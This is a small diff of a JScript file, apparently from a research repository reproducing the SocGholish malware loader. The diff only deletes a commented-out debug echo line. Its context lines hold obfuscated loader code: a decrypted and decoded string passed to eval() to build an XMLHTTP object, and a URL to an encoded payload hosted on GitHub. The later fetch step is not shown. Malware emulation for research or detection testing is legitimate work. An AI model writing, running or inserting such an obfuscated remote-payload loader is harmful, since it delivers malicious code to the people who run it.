@@ -68,8 +68,6 @@ var _a0x2346 = decrypt(decode(mapping._0x5555), 4) + _a0x7821;
 
 var XmlHttp_Object = eval(_a0x2346);
 
-// WScript.Echo(_a0x7821);
-
 // URL of the JavaScript file on GitHub
 var githubFileUrl = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/encoded-payload.txt";
 
